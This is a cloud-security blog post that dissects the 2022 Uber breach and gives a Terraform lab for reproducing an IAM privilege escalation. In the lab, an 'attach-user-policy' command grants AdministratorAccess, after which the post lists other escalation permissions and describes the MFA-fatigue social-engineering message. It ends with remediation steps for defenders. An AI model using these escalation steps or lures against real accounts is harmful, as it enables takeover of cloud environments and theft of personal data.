# Case #02 — IAM Privilege Escalation: How an 18-Year-Old Took Over Uber's AWS

> **🔪 The AWS Autopsy** | Dissecting real cloud breaches with hands-on Terraform labs
> **Series:** [awsautopsy.hashnode.dev](https://awsautopsy.hashnode.dev) | **GitHub:** [github.com/ridamdarji25/AWS-Autopsy](https://github.com/ridamdarji25/AWS-Autopsy)

---

## Introduction

In September 2022, an 18-year-old hacker compromised Uber's entire cloud infrastructure. They accessed S3 buckets containing rider PII, EC2 instances across regions, internal dashboards, company Slack, and most critically — Uber's private HackerOne bug bounty reports, which contained a map of every unpatched vulnerability in their systems.

No zero-days were used. No nation-state-level tooling. The attack succeeded because of three compounding mistakes that exist in thousands of AWS environments right now:

1. MFA implemented using push notifications (susceptible to fatigue attacks)
2. Credentials hardcoded in a PowerShell script on a shared network drive
3. IAM policies with wildcard `iam:AttachUserPolicy` permissions

In this post we'll dissect the full attack chain and then replicate the IAM privilege escalation vector in a hands-on Terraform lab.

---

## The Breach — Full Kill Chain

### Phase 1: MFA Fatigue Attack

The attacker obtained an Uber contractor's credentials — likely through a combination of phishing and credential stuffing from previous data leaks. Uber used MFA, so credentials alone were not enough.

The technique used was **MFA fatigue** (also called MFA push bombing):

1. The attacker triggered repeated MFA push notifications to the contractor's phone
2. After dozens of denials, the contractor grew confused and fatigued
3. The attacker texted the contractor directly, impersonating Uber IT support: *"We're seeing suspicious activity on your account. To stop it, please approve the next verification request."*
4. The contractor approved it
5. The attacker was inside Uber's VPN

📸 [ADD SCREENSHOT HERE — MFA fatigue attack flow diagram]

**Why this works:** Push-based MFA places the entire security decision on a tired, non-technical employee receiving a notification. When paired with social engineering, it is trivially bypassed.

**The fix:** Hardware security keys (YubiKey), FIDO2 passkeys, or number-matching MFA make fatigue attacks impossible.

---

### Phase 2: Hardcoded Credentials in a PowerShell Script

Once inside the VPN, the attacker explored internal network shares — essentially shared folders accessible to Uber employees on the intranet.

They found a PowerShell automation script used by IT/DevOps. Inside that script:

```powershell
# PAM Configuration
$pamUsername = "svc-admin"
$pamPassword = "Uber@Internal2022!"
$pamEndpoint = "https://internal-pam.uber.com/api/v1"
```

A developer had hardcoded PAM (Privileged Access Manager) credentials directly into the script and stored it on a shared drive. This is one of the most common and most catastrophic mistakes in enterprise environments.

📸 [ADD SCREENSHOT HERE — Example of hardcoded credential in script]

**Why this is devastating:** PAM systems are specifically designed to hold the most privileged credentials in an organization. They are the master key vault. Leaving the vault key in a plaintext file on a shared drive negates the entire purpose of having a PAM system.

---

### Phase 3: PAM Vault Unlocked

With the hardcoded credentials, the attacker authenticated to Uber's Privileged Access Manager and found:

| Credential Type | Access Level |
|----------------|-------------|
| AWS IAM keys | Admin-level |
| GCP service account keys | Admin-level |
| Google Workspace | Super Admin |
| Windows Domain Admin | Full internal AD |

Every crown jewel. All in one place. No additional MFA protecting individual secrets.

📸 [ADD SCREENSHOT HERE — PAM architecture diagram showing credential storage]

---

### Phase 4: IAM Privilege Escalation

With the AWS keys from PAM, the attacker now had IAM-level access to Uber's AWS environment. The keys belonged to a user or role with overly permissive IAM policies — specifically, the ability to attach any IAM policy to any user.

The attack was a single AWS CLI command:

```bash
aws iam attach-user-policy \
  --user-name attacker \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

This attached AWS managed `AdministratorAccess` — full permissions on every service in every region — to the attacker's own user. From low-privilege to god-mode in under 15 seconds.

📸 [ADD SCREENSHOT HERE — IAM escalation path diagram: AttachUserPolicy abuse]

The specific permission that enabled this is `iam:AttachUserPolicy` scoped to `Resource: "*"`. It is one of several IAM privilege escalation paths documented by security researchers. Others include:

- `iam:CreatePolicyVersion` — overwrite an existing policy with an admin version
- `iam:PassRole` + `ec2:RunInstances` — launch EC2 with an admin role attached
- `iam:CreateAccessKey` — generate new keys for an existing admin user

---

### Phase 5: The Blast Radius

With `AdministratorAccess`:

**S3:** Rider PII, financial data, internal documents
**EC2:** Backend services, internal tooling
**HackerOne:** Private bug reports — a complete list of every unpatched vulnerability Uber had at that moment. This was arguably the most dangerous data accessed.
**Slack:** Full company communications, strategy discussions, sensitive conversations
**Internal dashboards:** Analytics, operations, monitoring

📸 [ADD SCREENSHOT HERE — Blast radius diagram showing all compromised services]

The attacker then announced the breach in Uber's #announcements Slack channel. Employees initially dismissed it as a prank. Then they started checking systems.

Uber took down Slack, internal tools, and engineering systems while incident response was engaged.

---

## The Hands-On Lab

Now let's replicate the IAM privilege escalation in our own AWS environment using Terraform.

### What We Build

```
attacker-user (low-priv)           sensitive-bucket (restricted)
      |                                     |
      | has iam:AttachUserPolicy            | contains simulated PII
      | on Resource: *                      | financial records
      |                                     | HackerOne-style vuln data
      v                                     |
 EXPLOIT: attach AdministratorAccess -------> PROFIT: full bucket access
```

### Prerequisites

- AWS account (Free Tier sufficient)
- Terraform >= 1.3.0
- AWS CLI v2 configured with an admin profile for initial setup

---

### Step 1: Deploy the Lab

```bash
git clone https://github.com/ridamdarji25/AWS-Autopsy.git
cd AWS-Autopsy/Case-02-IAM-PrivEsc-Uber/LabSetup

terraform init
terraform plan
terraform apply
```

📸 [ADD SCREENSHOT HERE — terraform apply output showing resources created]

---

### Step 2: Configure the Attacker Profile

```bash
# Get the secret key
terraform output -raw attacker_secret_access_key

# Configure the attacker AWS profile
aws configure --profile attacker
# AWS Access Key ID: (from terraform output attacker_access_key_id)
# AWS Secret Access Key: (from command above)
# Default region name: us-east-1
# Default output format: json
```

---

### Step 3: Verify Identity — You Are Nobody

```bash
aws sts get-caller-identity --profile attacker
```

Expected output:
```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/w1tn3sss-attacker-user"
}
```

📸 [ADD SCREENSHOT HERE — get-caller-identity output showing attacker-user]

---

### Step 4: Confirm No Access to Sensitive Bucket

```bash
aws s3 ls s3://w1tn3sss-sensitive-bucket --profile attacker
```

Expected output:
```
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

📸 [ADD SCREENSHOT HERE — Access Denied on sensitive bucket]

This is the starting state. The attacker is a nobody with no meaningful access.

---

### Step 5: Enumerate Permissions

```bash
aws iam list-attached-user-policies \
  --user-name w1tn3sss-attacker-user \
  --profile attacker
```

📸 [ADD SCREENSHOT HERE — list-attached-user-policies output]

You'll see `w1tn3sss-attacker-policy` attached. To inspect its permissions:

```bash
# Get policy ARN from the output above, then:
aws iam get-policy-version \
  --policy-arn <policy-arn> \
  --version-id v1 \
  --profile attacker
```

Buried in the policy statements, you'll find:

```json
{
  "Sid": "DANGEROUS-AllowPolicyAttach",
  "Effect": "Allow",
  "Action": ["iam:AttachUserPolicy"],
  "Resource": "*"
}
```

There it is. `iam:AttachUserPolicy` on `Resource: *`. That's the loaded gun.

---

### Step 6: EXPLOIT — Attach AdministratorAccess

```bash
aws iam attach-user-policy \
  --user-name w1tn3sss-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker
```

No error. No confirmation prompt. It just works.

📸 [ADD SCREENSHOT HERE — attach-user-policy command succeeding]

---

### Step 7: Access the Sensitive Bucket

```bash
# List the bucket
aws s3 ls s3://w1tn3sss-sensitive-bucket --profile attacker

# Download financial data
aws s3 cp s3://w1tn3sss-sensitive-bucket/financial/q3-2022-revenue.txt . --profile attacker

# Download the PII
aws s3 cp s3://w1tn3sss-sensitive-bucket/rider-pii/user-data-2022.csv . --profile attacker

# Download the vuln list
aws s3 cp s3://w1tn3sss-sensitive-bucket/security/unpatched-vulns.txt . --profile attacker
```

📸 [ADD SCREENSHOT HERE — successful S3 access after escalation]

Full access. Same account. Same user. One command changed everything.

---

## Remediation

### Fix 1: Remove Wildcard from iam:AttachUserPolicy

**Before (vulnerable):**
```json
{
  "Effect": "Allow",
  "Action": ["iam:AttachUserPolicy"],
  "Resource": "*"
}
```

**After (fixed):**
```json
{
  "Effect": "Allow",
  "Action": ["iam:AttachUserPolicy"],
  "Resource": "arn:aws:iam::123456789012:user/specific-allowed-user"
}
```

Only allow attaching policies to specific, explicitly named users. Never `*`.

---

### Fix 2: Apply a Permission Boundary

Permission boundaries are an IAM feature that set the **maximum** permissions a user can ever have — regardless of what policies are attached to them.

```bash
# Apply the permission boundary from our Terraform outputs
aws iam put-user-permissions-boundary \
  --user-name w1tn3sss-attacker-user \
  --permissions-boundary arn:aws:iam::123456789012:policy/w1tn3sss-permission-boundary
```

The boundary policy explicitly **denies** all IAM write actions:

```json
{
  "Sid": "DenyIAMWrite",
  "Effect": "Deny",
  "Action": [
    "iam:AttachUserPolicy",
    "iam:DetachUserPolicy",
    "iam:PutUserPolicy",
    "iam:CreatePolicy",
    "iam:CreatePolicyVersion",
    "iam:PassRole"
  ],
  "Resource": "*"
}
```

Even if a policy grants `iam:AttachUserPolicy`, the boundary overrides it. The escalation path is closed.

📸 [ADD SCREENSHOT HERE — attach-user-policy now returning Access Denied after boundary applied]

---

### Fix 3: Enable IAM Access Analyzer

IAM Access Analyzer automatically scans your IAM policies and flags privilege escalation paths, overly permissive policies, and external access.

```bash
aws accessanalyzer create-analyzer \
  --analyzer-name uber-case-analyzer \
  --type ACCOUNT
```

It would have detected `iam:AttachUserPolicy` on `Resource: *` and flagged it before any attacker ever had the chance.

📸 [ADD SCREENSHOT HERE — IAM Access Analyzer findings dashboard]

---

### Verify the Fix

```bash
# Detach AdministratorAccess first (cleanup from exploit)
aws iam detach-user-policy \
  --user-name w1tn3sss-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Try the exploit again
aws iam attach-user-policy \
  --user-name w1tn3sss-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker
# Expected: An error occurred (AccessDenied)
```

📸 [ADD SCREENSHOT HERE — exploit attempt now returning Access Denied]

Attack path closed.

---

## Cleanup

```bash
terraform destroy
```

This removes all IAM users, roles, policies, and S3 buckets created by the lab.

---

## Key Takeaways

**1. `iam:AttachUserPolicy` on `Resource: *` is a privilege escalation path, not just a misconfiguration.** Any user with this permission can make themselves an administrator. Treat it like root access.

**2. Permission boundaries are your safety net.** They cap the blast radius of any IAM misconfiguration. Deploy them as organizational policy for all non-admin users.

**3. IAM Access Analyzer is free and catches these paths automatically.** There is no excuse for not enabling it in every account.

**4. Hardcoded credentials are a single file discovery away from full compromise.** Use AWS Secrets Manager. Use Parameter Store. Run `git-secrets` in your CI pipeline. Never hardcode.

**5. MFA fatigue is solved by hardware keys, not user education.** FIDO2 passkeys and hardware tokens are phishing and fatigue-proof by design. Push-based MFA is not.

---

## What's Next

**Case #03 — Secrets Leaked on GitHub (Toyota + Multiple Orgs)**

How hardcoded AWS keys in public GitHub repos led to mass data exposure — and how to detect and prevent it with GitGuardian, AWS Macie, and automated secret scanning.

Follow along: [awsautopsy.hashnode.dev](https://awsautopsy.hashnode.dev)
GitHub: [github.com/ridamdarji25/AWS-Autopsy](https://github.com/ridamdarji25/AWS-Autopsy)
LinkedIn: [linkedin.com/in/ridamdarji](https://linkedin.com/in/ridamdarji)

---

*Ridam Darji — AWS Builder Community | Cloud Security Practitioner*
